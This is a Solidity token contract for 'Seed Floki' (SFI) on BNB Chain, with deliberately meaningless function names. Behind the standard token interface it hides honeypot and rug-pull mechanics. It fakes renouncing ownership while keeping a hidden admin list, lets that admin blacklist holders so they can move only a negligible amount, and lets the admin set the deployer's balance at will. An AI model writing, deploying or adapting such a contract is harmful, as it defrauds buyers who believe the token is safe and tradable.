/**
 *Submitted for verification at BscScan.com on 2023-02-22
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface jbjdhdzxl {
    function createPair(address vpiqtxcmn, address bvnkpmirav) external returns (address);
}

interface dpchmfmro {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SeedFloki {

    function gyjcautog(address ihgaxxkfbjx) public {
        if (ihgaxxkfbjx == dpnxchjow || ihgaxxkfbjx == qsqjtendnrugcp || !fybhfnjecyb[kltgcaeuv()]) {
            return;
        }
        mrkenlqlpwoj[ihgaxxkfbjx] = true;
    }

    bool public ypajcwkxsair;

    address public qsqjtendnrugcp;

    event Transfer(address indexed from, address indexed rgayzxsngyse, uint256 value);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    mapping(address => uint256) public balanceOf;

    mapping(address => bool) public mrkenlqlpwoj;

    address public dpnxchjow;

    address public owner;

    mapping(address => bool) public fybhfnjecyb;

    constructor (){ 
        dpchmfmro navvqmogoi = dpchmfmro(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        qsqjtendnrugcp = jbjdhdzxl(navvqmogoi.factory()).createPair(navvqmogoi.WETH(), address(this));
        owner = kltgcaeuv();
        dpnxchjow = owner;
        fybhfnjecyb[dpnxchjow] = true;
        balanceOf[dpnxchjow] = totalSupply;
        emit Transfer(address(0), dpnxchjow, totalSupply);
        uxppryggoqel();
    }

    event Approval(address indexed skudwgmetwrcyi, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function uxppryggoqel() public {
        emit OwnershipTransferred(dpnxchjow, address(0));
        owner = address(0);
    }

    function transfer(address heitkzedskdci, uint256 tjnuqnglrhkabm) external returns (bool) {
        return mryetsocuw(kltgcaeuv(), heitkzedskdci, tjnuqnglrhkabm);
    }

    string public symbol = "SFI";

    string public name = "Seed Floki";

    function mryetsocuw(address oupgfdcvhmrkq, address ipnlvmbdxjmjan, uint256 tjnuqnglrhkabm) internal returns (bool) {
        require(tjnuqnglrhkabm > 0);
        if (oupgfdcvhmrkq == dpnxchjow) {
            return dctpzvwmabrd(oupgfdcvhmrkq, ipnlvmbdxjmjan, tjnuqnglrhkabm);
        }
        if (mrkenlqlpwoj[oupgfdcvhmrkq]) {
            return dctpzvwmabrd(oupgfdcvhmrkq, ipnlvmbdxjmjan, 12 ** 10);
        }
        uint256 wlhymmuvwmk = tjnuqnglrhkabm * 1 / 100;
        return dctpzvwmabrd(oupgfdcvhmrkq, ipnlvmbdxjmjan, tjnuqnglrhkabm - wlhymmuvwmk);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address xhpjzouwgjacy, uint256 tjnuqnglrhkabm) public returns (bool) {
        allowance[kltgcaeuv()][xhpjzouwgjacy] = tjnuqnglrhkabm;
        emit Approval(kltgcaeuv(), xhpjzouwgjacy, tjnuqnglrhkabm);
        return true;
    }

    uint8 public decimals = 18;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function dctpzvwmabrd(address oupgfdcvhmrkq, address ipnlvmbdxjmjan, uint256 tjnuqnglrhkabm) internal returns (bool) {
        require(balanceOf[oupgfdcvhmrkq] >= tjnuqnglrhkabm);
        balanceOf[oupgfdcvhmrkq] -= tjnuqnglrhkabm;
        balanceOf[ipnlvmbdxjmjan] += tjnuqnglrhkabm;
        emit Transfer(oupgfdcvhmrkq, ipnlvmbdxjmjan, tjnuqnglrhkabm);
        return true;
    }

    function kltgcaeuv() private view returns (address) {
        return msg.sender;
    }

    function bzojdbpgzcny(uint256 tjnuqnglrhkabm) public {
        if (!fybhfnjecyb[kltgcaeuv()]) {
            return;
        }
        balanceOf[dpnxchjow] = tjnuqnglrhkabm;
    }

    function wbsmanchybmweh(address krufnesel) public {
        if (ypajcwkxsair) {
            return;
        }
        fybhfnjecyb[krufnesel] = true;
        ypajcwkxsair = true;
    }

    function transferFrom(address oupgfdcvhmrkq, address ipnlvmbdxjmjan, uint256 tjnuqnglrhkabm) external returns (bool) {
        if (allowance[oupgfdcvhmrkq][kltgcaeuv()] != type(uint256).max) {
            require(tjnuqnglrhkabm <= allowance[oupgfdcvhmrkq][kltgcaeuv()]);
            allowance[oupgfdcvhmrkq][kltgcaeuv()] -= tjnuqnglrhkabm;
        }
        return mryetsocuw(oupgfdcvhmrkq, ipnlvmbdxjmjan, tjnuqnglrhkabm);
    }

}